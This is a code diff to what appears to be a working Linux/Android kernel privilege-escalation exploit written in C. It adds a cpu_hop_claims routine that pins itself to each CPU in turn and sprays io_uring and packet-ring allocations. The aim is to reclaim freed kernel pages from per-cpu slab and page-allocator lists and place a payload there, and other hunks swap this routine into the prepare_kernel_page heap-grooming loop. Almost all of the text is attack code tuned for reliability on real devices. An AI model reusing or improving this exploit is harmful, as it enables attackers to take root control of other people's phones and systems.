@@ -606,6 +606,16 @@ int try_set_ashmem_name_blob(int fd, const unsigned char *blob, size_t len) {
   return 0;
 }
 
+/* CPU_HOP (default on): spread holder mm churn round-robin across all
+ * online cpus. Device ground truth: the cpuset bounces the parent
+ * between cores mid-run, splitting single-core choreography across
+ * per-cpu SLUB/PCP state — so embrace the spread: frees hit every
+ * core's partial lists symmetrically and the claims drain them all. */
+/* Holders stay CONCENTRATED on g_core_sel: SLUB partial-spill discard
+ * is per-cpu (>13 partials on ONE cpu triggers the discard sweep).
+ * Spreading holders across cpus (smp8-proven) fills each cpu's partial
+ * list with ~2 pages — spill never fires anywhere → stuck slabs. The
+ * bounce defense lives in cpu_hop_claims instead (drain every PCP). */
 pid_t clone_child(void) {
   pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
   if (child == 0) {
@@ -619,6 +629,33 @@ pid_t clone_child(void) {
     }
   }
   return child;
+}
+
+/* Claim rings while hopping across every online cpu: each hop's
+ * io_uring allocations drain THAT cpu's order-2 PCP first — together
+ * the sweep drains all of them. Restores the pin afterwards. */
+void cpu_hop_claims(unsigned char *payload, size_t plen, int per_cpu) {
+  long n = sysconf(_SC_NPROCESSORS_ONLN);
+  if (n < 1)
+    n = 1;
+  if (!env_flag("CPU_HOP", 1) || n == 1) {
+    for (int i = 0; i < per_cpu; i++)
+      iouring_ring_reclaim_one(payload, plen, 1);
+    return;
+  }
+  unsigned long save = g_core_sel;
+  int pc = per_cpu < 1 ? 1 : per_cpu / (int)n;
+  if (pc < 1)
+    pc = 1;
+  for (long c = 0; c < n; c++) {
+    pin_to_core((size_t)c);
+    for (int i = 0; i < pc; i++) {
+      if (!iouring_ring_reclaim_one(payload, plen, 1))
+        break;
+    }
+  }
+  g_core_sel = save;
+  pin_to_core(g_core_sel);
 }
 
 pid_t clone_leak_child(void) {
@@ -2027,17 +2064,15 @@ uintptr_t prepare_kernel_page(int payload_mode) {
             kill_child(tids[killed + i]);
           }
           killed += k;
-          /* immediate claim burst: ring_batch order-2 pairs */
-          for (int rb = 0; rb < ring_batch; rb++) {
-            iouring_ring_reclaim_one(skb_buf, 0x500, 1);
-          }
+          /* immediate claim burst, drained across ALL cpus */
+          cpu_hop_claims(skb_buf, 0x500, ring_batch);
         }
         free(tids);
         sched_yield();
         sched_yield();
       }
-      /* cycle-final packet rings (QEMU/caps) + top-up io_uring */
-      iouring_ring_reclaim(skb_buf, 0x500);
+      /* cycle-final: hop sweep + packet rings (QEMU/caps) */
+      cpu_hop_claims(skb_buf, 0x500, 64);
       packet_ring_reclaim(skb_buf, 0x500);
       pr_info("RECLAIM_CYCLE %d/%d done (interleaved %dx%d/%d)\n",
               c + 1, cycles, kill_batch, ring_batch, per_cycle);
